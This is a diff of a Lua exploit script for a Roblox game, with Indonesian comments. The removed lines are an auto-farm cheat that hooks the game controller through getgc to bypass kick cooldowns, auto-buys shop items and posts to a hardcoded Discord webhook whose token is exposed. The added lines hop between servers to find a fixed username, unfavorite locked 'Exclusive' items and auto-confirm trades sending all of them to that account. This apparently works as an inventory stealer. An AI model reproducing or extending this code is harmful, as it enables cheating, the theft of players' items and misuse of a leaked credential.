-local rev_MeteorShop_Buy = findRemote("rev_MeteorShop_Buy", "RemoteEvent")
-
--- =============================================
--- 📢 DISCORD WEBHOOK NOTIFIER (PATAGOTITAN, FRIGOREX, TRICERABOB - ZERO LAG & INSTANT)
--- =============================================
-local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1539697793973756084/1oLTQDKSmutWJlPX91He00IEEAg_lsos8MWbxuXki8LKqO8WnZUX8kwurULVjdB8lOqb"
-
--- URL CDN Langsung (0x Request HTTP Ekstra, 100% Bebas Freeze/Lag)
-local PATAGO_IMAGE_URL = "https://www.roblox.com/asset-thumbnail/image?assetId=95399484334874&width=420&height=420&format=png"
-local FRIGOREX_IMAGE_URL = "https://www.roblox.com/asset-thumbnail/image?assetId=140510107418430&width=420&height=420&format=png"
-
-local function sendDiscordWebhook(itemName, totalBought)
-    totalBought = totalBought or 1
-    task.defer(function()
-        task.spawn(function()
-            pcall(function()
-                local httpReq = request or http_request or (delta and delta.request) or (syn and syn.request) or (Fluxus and Fluxus.request) or (http and http.request)
-                if not httpReq then return end
-                local HttpService = game:GetService("HttpService")
-
-                local userDisplayName = lp and lp.DisplayName or (lp and lp.Name or "Unknown")
-                local userId = lp and tostring(lp.UserId) or "0"
-                local playerAvatarCdn = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%s&width=150&height=150&format=png", userId)
-
-                local itemImageUrl = ""
-                local embedColor = 0x3498db
-                local itemIcon = "🛒"
-                local unitCost = 0
-                local itemBuff = ""
-
-                if itemName == "Patagotitan" then
-                    itemIcon = "🦖"
-                    embedColor = 0x2ecc71 -- Hijau Emerald
-                    itemImageUrl = PATAGO_IMAGE_URL
-                    unitCost = 500
-                    itemBuff = "150% CP/s"
-                elseif itemName == "Frigorex" then
-                    itemIcon = "👑"
-                    embedColor = 0x9b59b6 -- Ungu Royal
-                    itemImageUrl = FRIGOREX_IMAGE_URL
-                    unitCost = 1250
-                    itemBuff = "250% CP/s"
-                elseif itemName == "Tricerabob" then
-                    itemIcon = "🦏"
-                    embedColor = 0xe67e22 -- Oranye Golden
-                    itemImageUrl = playerAvatarCdn
-                    unitCost = 750
-                    itemBuff = "Exclusive Meteor Brainrot"
-                end
-
-                local totalCost = unitCost * totalBought
-                local titleDesc = (totalBought > 1) and string.format("%s %dx %s", itemIcon, totalBought, itemName) or string.format("%s %s", itemIcon, itemName)
-
-                local payload = {
-                    ["username"] = "KALB Meteor Shop",
-                    ["avatar_url"] = playerAvatarCdn,
-                    ["embeds"] = {
-                        {
-                            ["author"] = {
-                                ["name"] = userDisplayName,
-                                ["icon_url"] = playerAvatarCdn
-                            },
-                            ["title"] = "Berhasil Membeli",
-                            ["description"] = titleDesc,
-                            ["color"] = embedColor,
-                            ["thumbnail"] = {
-                                ["url"] = itemImageUrl
-                            },
-                            ["fields"] = {
-                                {
-                                    ["name"] = "Exclusive",
-                                    ["value"] = itemBuff,
-                                    ["inline"] = false
-                                },
-                                {
-                                    ["name"] = "Jumlah",
-                                    ["value"] = string.format("%d Unit", totalBought),
-                                    ["inline"] = true
-                                },
-                                {
-                                    ["name"] = "Total Harga",
-                                    ["value"] = string.format("%d Tokens", totalCost),
-                                    ["inline"] = true
-                                }
-                            },
-                            ["footer"] = {
-                                ["text"] = "KALB - Meteor Shop"
-                            },
-                            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-                        }
-                    }
-                }
-
-                httpReq({
-                    Url = DISCORD_WEBHOOK_URL,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = HttpService:JSONEncode(payload)
-                })
-            end)
-        end)
-    end)
-end
-
--- =============================================
--- 🛒 AUTO BUY METEOR SHOP (PATAGOTITAN, SPEED, FRIGOREX, TRICERABOB)
--- =============================================
-if rev_MeteorShop_Stock then
-    rev_MeteorShop_Stock.OnClientEvent:Connect(function(stockData, expiryTimestamp)
-        if type(stockData) ~= "table" then return end
-        
-        local buyRemote = rev_MeteorShop_Buy or (networkFolder and networkFolder:FindFirstChild("rev_MeteorShop_Buy"))
-        if not buyRemote then return end
-
-        for itemName, itemInfo in pairs(stockData) do
-            if type(itemInfo) == "table" then
-                local stockCount = tonumber(itemInfo.Stock) or 0
-                
-                if stockCount > 0 then
-                    local shouldBuy = false
-
-                    if itemName == "Patagotitan" and _G.autoBuyPatagotitan then
-                        shouldBuy = true
-                    elseif itemName == "Speed" and _G.autoBuySpeed then
-                        shouldBuy = true
-                    elseif itemName == "Frigorex" and _G.autoBuyFrigorex then
-                        shouldBuy = true
-                    elseif itemName == "Tricerabob" and _G.autoBuyTricerabob then
-                        shouldBuy = true
-                    end
-
-                    if shouldBuy then
-                        task.spawn(function()
-                            local boughtCount = 0
-                            for i = 1, stockCount do
-                                pcall(function()
-                                    buyRemote:FireServer(itemName)
-                                    boughtCount = boughtCount + 1
-                                    print(string.format("🛒 [METEOR AUTO BUY] Berhasil membeli %s (#%d/%d)!", itemName, i, stockCount))
-                                end)
-                                task.wait(0.15)
-                            end
-                            if boughtCount > 0 and (itemName == "Patagotitan" or itemName == "Frigorex" or itemName == "Tricerabob") then
-                                sendDiscordWebhook(itemName, boughtCount)
-                            end
-                        end)
-                    end
-                end
-            end
-        end
-    end)
-end
-
--- Loop Request Sync Stock setiap 60 Detik
-task.spawn(function()
-    task.wait(3)
-    while true do
-        if _G.autoFarm and (_G.autoBuyPatagotitan or _G.autoBuySpeed or _G.autoBuyFrigorex or _G.autoBuyTricerabob) then
-            pcall(function()
-                local syncRemote = rev_MeteorShop_RequestSync or (networkFolder and networkFolder:FindFirstChild("rev_MeteorShop_RequestSync"))
-                if syncRemote then
-                    syncRemote:FireServer()
-                end
-            end)
-        end
-        task.wait(60)
-    end
-end)
-
--- =============================================
--- 🧪 AUTO BUY FARM POTION (KHUSUS JAM GANJIL WIB: 1, 3, 5... 23 & MAX MENIT :10)
--- =============================================
-local lastBoughtFarmPotionHour = -1
-
-task.spawn(function()
-    task.wait(2)
-    while true do
-        if _G.autoFarm and _G.autoBuyFarmPotion then
-            pcall(function()
-                local wibTime = os.date("!*t", os.time() + (7 * 3600))
-                local hourWIB = wibTime.hour
-                local minWIB = wibTime.min
-                local secWIB = wibTime.sec
-
-                -- Hanya beli jika jam ganjil (1, 3, 5... 23) DAN menit masih <= 10
-                if (hourWIB % 2 == 1) and (minWIB <= 10) and (lastBoughtFarmPotionHour ~= hourWIB) then
-                    lastBoughtFarmPotionHour = hourWIB
-                    
-                    local buyRemote = rev_MeteorShop_Buy or (networkFolder and networkFolder:FindFirstChild("rev_MeteorShop_Buy"))
-                    if buyRemote then
-                        buyRemote:FireServer("Farm Potion")
-                        print(string.format("🧪 [AUTO BUY WIB] Berhasil membeli 1x Farm Potion pada jam %02d:%02d:%02d WIB (Di bawah menit :10)!", hourWIB, minWIB, secWIB))
-                    end
-                end
-            end)
-        end
-        task.wait(5)
-    end
-end)
-
--- =============================================
--- 💰 AUTO SELL ALL (SETIAP 5 DETIK)
--- =============================================
-task.spawn(function()
-    while task.wait(5) do
-        if not _G.autoFarm or not _G.autoSellAll then continue end
-        pcall(function()
-            local sellRemote = ref_B_SellAll or (networkFolder and networkFolder:FindFirstChild("ref_B_SellAll"))
-            if sellRemote then
-                sellRemote:InvokeServer()
-            end
-        end)
-    end
-end)
-
--- =============================================
--- 🎮 LAPIS 1: ULTRA-LIGHTWEIGHT CONTROLLER HOOK (ZERO-FREEZE & NON-BLOCKING)
--- =============================================
-local cachedGameController = nil
-
-local function getGameController()
-    if cachedGameController and type(cachedGameController.Kick) == "function" then
-        return cachedGameController
-    end
-
-    if getgc then
-        local ok, tables = pcall(function() return getgc(true) end)
-        if ok and type(tables) == "table" then
-            for _, item in ipairs(tables) do
-                if type(item) == "table" then
-                    if rawget(item, "CanKick") ~= nil and type(rawget(item, "Kick")) == "function" then
-                        cachedGameController = item
-                        return item
-                    end
-                end
-            end
-        end
-    end
-
-    return nil
-end
-
--- Pre-fetch controller saat script pertama kali dimuat
-task.spawn(function()
-    task.wait(1)
-    getGameController()
-end)
-
--- =============================================
--- 📡 LISTENER EVENT SERVER (REAL-TIME RECEPTOR)
--- =============================================
-local phase2Fired = false
-local collectedFired = false
-local kickEndedFired = false
-
-local function setupServerEventListeners()
-    local p2 = rev_kickPhase2 or findRemote("rev_kickPhase2", "RemoteEvent")
-    if p2 then
-        p2.OnClientEvent:Connect(function(rewardTable, ...)
-            phase2Fired = true
-            pcall(function()
-                if type(rewardTable) == "table" and rewardTable[1] then
-                    lastRewardDesc = string.format("%s [%s]", tostring(rewardTable[1].Name or "Brainrot"), tostring(rewardTable[1].Mutation or "Normal"))
-                    logConsole(string.format("🎉 Gacha Reward Masuk: %s", lastRewardDesc))
-                end
-            end)
-        end)
-    end
-
-    local col = rev_Collected or findRemote("rev_Collected", "RemoteEvent")
-    if col then
-        col.OnClientEvent:Connect(function(...)
-            collectedFired = true
-        end)
-    end
-
-    local ended = rev_KickEventEnded or findRemote("rev_KickEventEnded", "RemoteEvent")
-    if ended then
-        ended.OnClientEvent:Connect(function(...)
-            kickEndedFired = true
-        end)
-    end
-
-    local addW = rev_AddedWeather or findRemote("rev_AddedWeather", "RemoteEvent")
-    if addW then
-        addW.OnClientEvent:Connect(function(weatherType, ...)
-            if weatherType == "MeteorShower" then
-                isMeteorShowerActive = true
-                logConsole("☄️ Event Cuaca: METEOR SHOWER AKTIF! Memulai Auto Kick & Farm...")
-            end
-        end)
-    end
-
-    local remW = rev_RemovedWeather or findRemote("rev_RemovedWeather", "RemoteEvent")
-    if remW then
-        remW.OnClientEvent:Connect(function(weatherType, ...)
-            if weatherType == "MeteorShower" then
-                isMeteorShowerActive = false
-                logConsole("☁️ Event Cuaca: Meteor Shower Selesai. Menyelesaikan ronde ini lalu standby di Safe Zone...")
-            end
-        end)
-    end
-end
-setupServerEventListeners()
-
--- =============================================
--- ☄️ DETEKSI METEOR SHOWER REAL-TIME (MULTI-SOURCE)
--- =============================================
-local function checkMeteorShowerActive()
-    if isMeteorShowerActive then return true end
-    local debris = workspace:FindFirstChild("Debris")
-    if debris then
-        for _, child in ipairs(debris:GetChildren()) do
-            if child:IsA("Model") and tonumber(child.Name) ~= nil then
-                isMeteorShowerActive = true
-                return true
-            end
-        end
-    end
-    return false
-end
-
-local function shouldKick()
-    if not _G.autoFarm then return false end
-    if _G.onlyMeteorEvent then
-        return checkMeteorShowerActive()
-    end
-    return true
-end
-
--- =============================================
--- 🚀 FUNGSI EKSEKUSI TENDANGAN REINFORCED (LAPIS 1 + LAPIS 3 NETWORK)
--- =============================================
-local function executeKick()
-    local timestamp = nil
-    pcall(function() timestamp = workspace:GetServerTimeNow() end)
-    if not timestamp or type(timestamp) ~= "number" or timestamp <= 0 then
-        timestamp = tick()
-    end
-
-    logConsole("⚡ Mengeksekusi Kick (Lapis 1 Controller Hook + Lapis 3 Network)...")
-
-    -- 🎮 LAPIS 1: Direct GameController Hook (Buka Kunci Cooldown & Panggil Kick Asli di Game)
-    pcall(function()
-        local controller = getGameController()
-        if controller then
-            if controller.UnblockKick then pcall(function() controller:UnblockKick() end) end
-            if controller.ResetCooldown then pcall(function() controller:ResetCooldown() end) end
-            controller.CanKick = true
-            if controller.InGame ~= nil then controller.InGame = false end
-            if controller.Status ~= nil and controller.Status == "InKick" then controller.Status = "Lobby" end
-            pcall(function() controller:Kick(1, 1) end)
-        end
-    end)
-
-    -- 📡 LAPIS 3: Network Remote Invocation (Jalur Resmi Server Non-Blocking & Konfirmasi Sukses)
-    task.spawn(function()
-        pcall(function()
-            local targetRemote = ref_KickEvent or (networkFolder and networkFolder:FindFirstChild("ref_KickEvent"))
-            if not targetRemote then
-                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
-                    if r:IsA("RemoteFunction") and r.Name == "ref_KickEvent" then
-                        targetRemote = r
-                        ref_KickEvent = r
-                        break
-                    end
-                end
-            end
-
-            if targetRemote and targetRemote:IsA("RemoteFunction") then
-                local res = targetRemote:InvokeServer(1, 1, timestamp)
-                if res == true or (type(res) == "table" and res[1] == true) then
-                    kickAcceptedByServer = true
-                    logConsole("✅ [SERVER CONFIRMED] Tendangan resmi terdaftar di server! Bola sedang terbang...")
-                end
-            end
-
-            local fallbackEvent = kickRemote or (networkFolder and networkFolder:FindFirstChild("rev_KickEvent"))
-            if fallbackEvent and fallbackEvent:IsA("RemoteEvent") then
-                fallbackEvent:FireServer(1, 1, timestamp)
-            end
-        end)
-    end)
-end
-
--- =============================================
--- ⚙️ MAIN LOOP (STATE MACHINE AUTO FARM)
--- =============================================
-task.spawn(function()
-    while task.wait(0.05) do
-        if not _G.autoFarm then continue end
-
-        local char = lp.Character
-        local hum = char and char:FindFirstChild("Humanoid")
-        local hrp = char and char:FindFirstChild("HumanoidRootPart")
-
-        if not hum or not hrp then continue end 
-
-        -- [ PENDETEKSI MATI & RESPAWN ]
-        if hum.Health <= 0 then
-            targetAction = "WaitingRespawn"
-            lastAction = "WaitingRespawn"
-            globalStuckTimer = 0
-            kickRetryCount = 0
-            kickAcceptedByServer = false
-            continue 
-        end
-
-        if targetAction == "WaitingRespawn" and hum.Health > 0 then
-            targetAction = "Idle"
-            lastAction = "Idle"
-            kickRetryCount = 0
-            kickAcceptedByServer = false
-            stateTimer = 0
-            logConsole("Karakter Respawn -> Berjalan ke Safe Zone sebelum Kick...")
-        end
-
-        -- [ PENGATUR WAKTU & FAILSAFE RESET (MURNI JALAN TANPA TELEPORT) ]
-        if targetAction ~= lastAction then
-            globalStuckTimer = 0
-            stateTimer = 0 
-            lastAction = targetAction
-            logConsole("Transisi Fase -> " .. tostring(targetAction))
-        else
-            globalStuckTimer = globalStuckTimer + 0.05
-            stateTimer = stateTimer + 0.05 
+        if #candidateServers > 0 then
+            -- Pilih server acak yang tersedia
+            local chosen = candidateServers[math.random(1, #candidateServers)]
+            log(string.format("🚀 Teleportasi ke Server ID: %s (%d/%d pemain)...", chosen.id, chosen.playing, chosen.maxPlayers))
             
-            local maxTimeout = _G.failsafeTimeout or 45
-            if globalStuckTimer >= maxTimeout and targetAction ~= "WalkToSafeZone" then
-                globalStuckTimer = 0
-                stateTimer = 0
-                targetAction = "Idle"
-                logConsole("🚨 Failsafe Triggered: Reset ke Idle")
-                continue
-            end
-        end
-
-        local distToSafeZone = (hrp.Position - safeZone).Magnitude
-
-        -- [ FASE 1: IDLE / NENDANG DI SAFE ZONE (MURNI JALAN KAKI - TANPA TELEPORT) ]
-        if targetAction == "Idle" then
-            if distToSafeZone > 5 then
-                hum:MoveTo(safeZone)
-            else
-                if shouldKick() then
-                    if stateTimer >= 0.15 then
-                        pcall(function()
-                            hrp.AssemblyLinearVelocity = Vector3.zero
-                            hrp.AssemblyAngularVelocity = Vector3.zero
-                        end)
-                        kickRetryCount = 0
-                        kickAcceptedByServer = false
-                        phase2Fired = false
-                        collectedFired = false
-                        kickEndedFired = false
-                        executeKick()
-                        targetAction = "WaitingForPhase2"
-                    end
-                else
-                    task.wait(0.1)
-                end
-            end
-
-        -- [ FASE 2: NUNGGU PHASE 2 DARI SERVER -> LANGSUNG JALAN KE SAFEZONE ]
-        elseif targetAction == "WaitingForPhase2" then
-            if phase2Fired or collectedFired or kickEndedFired then
-                phase2Fired = false
-                kickRetryCount = 0
-                kickAcceptedByServer = false
-                targetAction = "WalkToSafeZone"
-                logConsole("Phase 2 Selesai / Lucky Block Kena -> Langsung Jalan ke Safe Zone")
-
-            -- Kondisi 1: Kick belum terdaftar sama sekali di server setelah 3 detik -> Retry
-            elseif not kickAcceptedByServer and stateTimer >= 3.0 and not phase2Fired and not collectedFired and not kickEndedFired then
-                if kickRetryCount < MAX_KICK_RETRIES then
-                    kickRetryCount = kickRetryCount + 1
-                    stateTimer = 0
-                    logConsole(string.format("⚠️ [RETRY] Kick belum terdaftar di server, mencoba kick ulang #%d/%d...", kickRetryCount, MAX_KICK_RETRIES))
-                    executeKick()
-                else
-                    logConsole(string.format("🚨 [FAILSAFE] Gagal respon setelah %d kali retry! Memaksa Respawn/Reset Karakter...", MAX_KICK_RETRIES))
-                    kickRetryCount = 0
-                    kickAcceptedByServer = false
-                    stateTimer = 0
-                    targetAction = "WaitingRespawn"
-                    pcall(function()
-                        if hum then hum.Health = 0 end
-                        if char then char:BreakJoints() end
-                    end)
-                end
-
-            -- Kondisi 2: Kick sudah diterima server (bola sedang terbang), tunggu hingga maksimal 20 detik
-            elseif stateTimer >= 20.0 then
-                kickAcceptedByServer = false
-                targetAction = "WalkToSafeZone"
-                logConsole("Phase 2 Timeout (20s) -> Lanjut Jalan ke Safe Zone")
-            end
-
-        -- [ FASE 3: JALAN MURNI SAMPAI KE SAFE ZONE (TANPA TELEPORT) ]
-        elseif targetAction == "WalkToSafeZone" then
             pcall(function()
-                if hum.WalkSpeed < 16 then hum.WalkSpeed = 16 end
-                if hrp.Anchored then hrp.Anchored = false end
+                TeleportService:TeleportToPlaceInstance(placeId, chosen.id, LocalPlayer)
             end)
-            hum:MoveTo(safeZone)
-            if distToSafeZone < 5 then
-                targetAction = "WaitingForCollected"
-                logConsole("Tiba di Safe Zone -> Menunggu Reward Collected")
-            end
-
-        -- [ FASE 4: NUNGGU COLLECTED & RE-KICK INSTAN / STOP JIKA METEOR BERAKHIR ]
-        elseif targetAction == "WaitingForCollected" then
-            if distToSafeZone >= 5 then
-                hum:MoveTo(safeZone)
-            end
-
-            if collectedFired or kickEndedFired or stateTimer >= 2.5 then
-                collectedFired = false
-                kickEndedFired = false
-                mutationCount = mutationCount + 1
-                phase2Fired = false
-                kickRetryCount = 0
-                kickAcceptedByServer = false
-
-                if shouldKick() then
-                    executeKick()
-                    targetAction = "WaitingForPhase2"
-                    logConsole(string.format("🎉 Total Mutasi: %d | Re-Kick Langsung!", mutationCount))
-                else
-                    targetAction = "Idle"
-                    logConsole(string.format("🎉 Total Mutasi: %d | Ronde Tuntas -> Standby di Safe Zone (Menunggu Event Meteor)", mutationCount))
-                end
-            end
+        else
+            log("⚠️ Tidak ada daftar server spesifik, melakukan teleport acak...")
+            pcall(function()
+                TeleportService:Teleport(placeId, LocalPlayer)
+            end)
         end
-    end
+    end)
+end
+
+-- Listener jika teleport gagal
+TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
+    log("⚠️ Teleport gagal: " .. tostring(errorMessage) .. ". Mengulang Server Hop...")
+    task.wait(2)
+    serverHop()
 end)
 
-print("--------------------------------------------------")
-print("🚀 [SUKSES] KALB Meteor Shower Auto Farm Siap Berjalan!")
-print("--------------------------------------------------")
+-- ==============================================================================
+-- 🤝 7. PROSES TRADE KE TARGET (szeshuro)
+-- ==============================================================================
+local function findTargetPlayer()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and string.lower(p.Name) == string.lower(TARGET_USERNAME) then
+            return p
+        end
+    end
+    return nil
+end
+
+local function isLocalConfirmed(tradeFrame)
+    if not tradeFrame then return false end
+    local p1 = tradeFrame:FindFirstChild("P1_Frame") and tradeFrame.P1_Frame:FindFirstChild("Confirmed")
+    return p1 and p1.Visible or false
+end
+
+local function isOpponentConfirmed(tradeFrame)
+    if not tradeFrame then return false end
+    local p2 = tradeFrame:FindFirstChild("P2_Frame") and tradeFrame.P2_Frame:FindFirstChild("Confirmed")
+    return p2 and p2.Visible or false
+end
+
+local function executeTradeBatch(targetPlayer, itemsToTrade)
+    if not targetPlayer or #itemsToTrade == 0 then return false end
+    if not ref_trade_r or not rev_trade_i then
+        log("❌ Error: Remote Trade tidak siap!")
+        return false
+    end
+
+    log(string.format("📤 Mengirim Trade Request ke %s (Kloter: %d item)...", targetPlayer.Name, #itemsToTrade))
+    notify("🤝 Trade Request", "Mengajak trade " .. targetPlayer.Name .. " (" .. #itemsToTrade .. " item)...", 3)
+
+    -- Kirim Trade Request
+    local requestSent = false
+    pcall(function()
+        task.spawn(function()
+            ref_trade_r:InvokeServer(targetPlayer.UserId)
+        end)
+        requestSent = true
+    end)
+
+    -- Tunggu TradingFrame terbuka di PlayerGui
+    local tradeFrame = nil
+    local waitTimer = 0
+    while waitTimer < TRADE_TIMEOUT do
+        tradeFrame = LocalPlayer.PlayerGui:FindFirstChild("TradingFrame", true)
+        if tradeFrame and tradeFrame.Visible then
+            break
+        end
+        task.wait(0.5)
+        waitTimer = waitTimer + 0.5
+    end
+
+    if not (tradeFrame and tradeFrame.Visible) then
+        log("⚠️ Timeout: Target tidak menerima trade request dalam waktu " .. TRADE_TIMEOUT .. " detik.")
+        return false
+    end
+
+    log("✅ Trade window terbuka! Mulai memasukkan item...")
+    notify("📦 Input Item", "Memasukkan " .. #itemsToTrade .. " item ke slot trade...", 3)
+
+    -- Masukkan item ke trade slot
+    for idx, tool in ipairs(itemsToTrade) do
+        local guid = getToolGUID(tool)
+        if guid then
+            -- Unfavorite jika terkunci
+            if AUTO_UNFAVORITE and isToolFavorite(tool) and rev_ToggleFav then
+                pcall(function() rev_ToggleFav:FireServer(guid) end)
+                task.wait(0.1)
+            end
+
+            pcall(function()
+                rev_trade_i:FireServer("AddItem", tostring(guid))
+            end)
+            log(string.format("   [%d/%d] Ditambahkan: %s", idx, #itemsToTrade, tool.Name))
+            task.wait(INSERT_DELAY)
+        end
+    end
+
+    -- Tunggu timer countdown game (5.5 detik)
+    log("⏳ Menunggu countdown trade phase 1 (5.5 detik)...")
+    task.wait(5.5)
+
+    -- Confirm Phase 1
+    pcall(function()
+        rev_trade_i:FireServer("Confirm")
+    end)
+    log("🔒 Konfirmasi Phase 1 terkirim.")
+
+    -- Tunggu konfirmasi lawan / countdown phase 2
+    local phase2Timer = 0
+    while tradeFrame and tradeFrame.Parent and tradeFrame.Visible do
+        if not isLocalConfirmed(tradeFrame) then break end
+        task.wait(0.2)
+        phase2Timer = phase2Timer + 0.2
+        if phase2Timer > 60 then
+            log("⚠️ Trade timeout menunggu konfirmasi lawan.")
+            return false
+        end
+    end
+
+    -- Confirm Phase 2 jika window masih terbuka
+    if tradeFrame and tradeFrame.Parent and tradeFrame.Visible then
+        log("⏳ Menunggu countdown trade phase 2 (5.5 detik)...")
+        task.wait(5.5)
+        pcall(function()
+            rev_trade_i:FireServer("Confirm")
+        end)
+        log("🔒 Konfirmasi Phase 2 terkirim.")
+
+        while tradeFrame and tradeFrame.Parent and tradeFrame.Visible do
+            task.wait(0.5)
+        end
+    end
+
+    log("🎉 Kloter trade berhasil diselesaikan!")
+    notify("✅ Trade Berhasil", #itemsToTrade .. " item Exclusive sukses terkirim!", 3)
+    task.wait(1.5)
+    return true
+end
+
+-- ==============================================================================
+-- 🚀 8. FUNGSI UTAMA AUTO SETOR & HOP (1X EXECUTE)
+-- ==============================================================================
+local function runAutoSetor()
+    log("🔍 Memeriksa stok item Exclusive di tas...")
+    local exclusiveItems = getExclusiveToolsInInventory()
+    local totalExclusive = #exclusiveItems
+
+    log(string.format("📊 Ditemukan %d item Exclusive di inventory.", totalExclusive))
+
+    -- KASUS 1: Tidak ada item Exclusive sama sekali di tas
+    if totalExclusive == 0 then
+        log("ℹ️ Tidak ada Brainrot Exclusive di inventory. Segera melakukan Server Hop...")
+        notify("📦 Stok Kosong", "Tidak ada item Exclusive di tas. Memulai Server Hop...", 4)
+        task.wait(1)
+        serverHop()
+        return
+    end
+
+    -- KASUS 2: Ada item Exclusive, cek target szeshuro
+    local targetPlayer = findTargetPlayer()
+    if not targetPlayer then
+        log(string.format("⚠️ Target '%s' TIDAK DITEMUKAN di server ini!", TARGET_USERNAME))
+        log(string.format("ℹ️ Memiliki %d item Exclusive, berpindah server untuk mencari target...", totalExclusive))
+        notify("⚠️ Target Tidak Ada", "Target " .. TARGET_USERNAME .. " tidak di server. Melakukan Server Hop...", 4)
+        task.wait(1)
+        serverHop()
+        return
+    end
+
+    -- KASUS 3: Ada item Exclusive DAN target ada di server!
+    log(string.format("🎯 Target '%s' DITEMUKAN! Memulai setor %d item Exclusive...", targetPlayer.Name, totalExclusive))
+    notify("🎯 Target Ditemukan", "Memulai setor " .. totalExclusive .. " item ke " .. targetPlayer.Name .. "...", 4)
+
+    local totalSent = 0
+    local retryCount = 0
+
+    while true do
+        local remainingItems = getExclusiveToolsInInventory()
+        if #remainingItems == 0 then
+            log("🎉 SEMUA ITEM EXCLUSIVE TELAH HABIS DISETOR!")
+            notify("🏆 Selesai", "Semua item Exclusive berhasil disetor ke " .. TARGET_USERNAME .. "!", 5)
+            break
+        end
+
+        -- Ambil maksimal 10 item per kloter
+        local batch = {}
+        for i = 1, math.min(10, #remainingItems) do
+            table.insert(batch, remainingItems[i])
+        end
+
+        local success = executeTradeBatch(targetPlayer, batch)
+        if success then
+            totalSent = totalSent + #batch
+            retryCount = 0
+            task.wait(1.5)
+        else
+            retryCount = retryCount + 1
+            log(string.format("⚠️ Trade gagal atau ditolak. Percobaan ulang #%d/3...", retryCount))
+            if retryCount >= 3 then
+                log("❌ Gagal trade 3x berturut-turut. Membatalkan dan melakukan Server Hop...")
+                break
+            end
+            task.wait(2)
+        end
+    end
+
+    -- Setelah semua selesai disetor, lakukan Server Hop ke server publik lain
+    log("==================================================")
+    log(string.format("🚀 Total %d item Exclusive disetor. Berpindah ke server publik lain...", totalSent))
+    log("==================================================")
+    notify("🌐 Selesai Setor", "Berhasil setor " .. totalSent .. " item. Melakukan Server Hop...", 4)
+    task.wait(1.5)
+    serverHop()
+end
+
+-- Jalankan otomatis saat di-execute
+runAutoSetor()
